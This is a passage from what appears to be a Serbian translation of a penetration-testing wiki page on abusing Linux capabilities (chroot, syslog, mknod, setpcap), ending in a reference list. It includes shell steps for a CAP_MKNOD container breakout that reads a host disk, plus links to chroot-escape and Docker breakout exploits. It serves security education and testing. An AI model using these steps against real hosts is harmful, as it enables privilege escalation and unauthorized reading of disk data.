> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) omogućava izvršavanje `chroot(2)` system call-a, što potencijalno može omogućiti escape iz `chroot(2)` okruženja kroz poznate ranjivosti.<sup>[[11]](#references)[[14]](#references)</sup>

- [Kako izaći iz različitih chroot rešenja](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t: alat za chroot escape](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) omogućava izvršavanje `reboot(2)` system call-a za restartovanje sistema, uključujući komande kao što je `LINUX_REBOOT_CMD_RESTART2`; takođe omogućava `kexec_load(2)` i, počevši od Linux 3.17, `kexec_file_load(2)` za učitavanje novih, odnosno potpisanih crash kernela.<sup>[[14]](#references)</sup>

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) izdvojen je iz šireg **CAP_SYS_ADMIN** u Linux 2.6.37, čime je konkretno omogućena upotreba `syslog(2)` poziva. Ova capability omogućava pregled kernel adresa preko `/proc` i sličnih interfejsa kada je `kptr_restrict` podešen na 1, što kontroliše izlaganje kernel adresa. Od Linux 2.6.39, podrazumevana vrednost za `kptr_restrict` je 0, što znači da su kernel adrese izložene, iako mnoge distribucije ovo podešavaju na 1 (sakrij adrese osim od uid 0) ili 2 (uvek sakrij adrese) iz bezbednosnih razloga.<sup>[[14]](#references)</sup>

Pored toga, **CAP_SYSLOG** omogućava pristup `dmesg` izlazu kada je `dmesg_restrict` podešen na 1. Uprkos ovim izmenama, **CAP_SYS_ADMIN** zadržava mogućnost izvršavanja `syslog` operacija zbog istorijskih razloga.<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) proširuje funkcionalnost `mknod` system call-a izvan kreiranja regularnih fajlova, FIFO-ova (named pipe-ova) ili UNIX domain socket-a. Konkretno, omogućava kreiranje specijalnih fajlova, koji uključuju:<sup>[[14]](#references)</sup>

- **S_IFCHR**: Character special fajlovi, odnosno uređaji kao što su terminali.
- **S_IFBLK**: Block special fajlovi, odnosno uređaji kao što su diskovi.

Ova capability je korisna za procese koji treba da kreiraju device fajlove, uključujući character ili block uređaje.<sup>[[14]](#references)</sup>

Uključena je u dokumentovani podrazumevani skup capability-ja u Docker-u; proverite stvarnu runtime konfiguraciju umesto da pretpostavite da svako deployment okruženje koristi ista podrazumevana podešavanja ([Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).<sup>[[19]](#references)</sup>

Ova capability omogućava privilege escalation (kroz čitanje celog diska) na hostu pod sledećim uslovima:<sup>[[7]](#references)</sup>

1. Imati početni pristup hostu (Unprivileged).
2. Imati početni pristup container-u (Privileged (EUID 0) i efektivni `CAP_MKNOD`).
3. Host i container treba da dele isti user namespace.

**Koraci za kreiranje i pristup Block Device-u u Container-u:**

1. **Na Host-u kao standardni korisnik:**

- Utvrdite svoj trenutni user ID pomoću `id`, npr. `uid=1000(standarduser)`.
- Identifikujte ciljni uređaj, na primer `/dev/sdb`.

2. **Unutar Container-a kao `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Ponovo na hostu:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Ovaj pristup omogućava standardnom korisniku da pristupi podacima sa `/dev/sdb` i potencijalno ih pročita kroz container kada su uređaj, namespaces i permissions konfigurisan na opisani način.<sup>[[7]](#references)</sup>

### CAP_SETPCAP

Na aktuelnim Linux kernelima sa file capabilities, **`CAP_SETPCAP`** omogućava niti da doda capabilities iz svog bounding seta u inheritable set, ukloni capabilities iz svog bounding seta i promeni svoje securebits. Ne omogućava procesu da proizvoljno dodeli capabilities drugom procesu; takvo ponašanje važi samo za kernele starije od 2.6.25, bez podrške za file capabilities.<sup>[[14]](#references)</sup>

Sistemski poziv `capset()` može da podesi sopstvene effective, permitted i inheritable setove niti, ali novi permitted set ne može da sadrži capabilities koje nisu u postojećem permitted setu, dok izmene inheritable seta i dalje podležu ograničenjima kernela.<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - laboratorije za privilege escalation pomoću Linux capabilities](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Privilege Escalation na Linuxu](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Osnove Linux containera: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Iskorišćavanje Linux capabilities](https://www.linuxjournal.com/article/5737)
- [6] [Prekomerne capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [Zloupotreba pristupa mount namespaces kroz /proc/pid/root](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities: Zašto postoje i kako rade](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Razumevanje capabilities u Linuxu](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [PoC za zaobilaženje seccomp-a ako je ptrace dozvoljen](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [Kako izaći iz različitih chroot rešenja](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - originalni CAP_DAC_READ_SEARCH Docker breakout exploit autora Sebastiana Krahmera](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Analiza Docker breakout exploita](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - Linux manualna stranica](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - Linux manualna stranica](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - Linux manualna stranica](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - Ubuntu manualna stranica](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - Linux manualna stranica](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [Pokretanje containera - Docker dokumentacija](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Docker dokumentacija](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - Linux manualna stranica](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - Linux manualna stranica](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - Linux manualna stranica](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - Linux manualna stranica](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - Linux manualna stranica](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - Linux manualna stranica](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
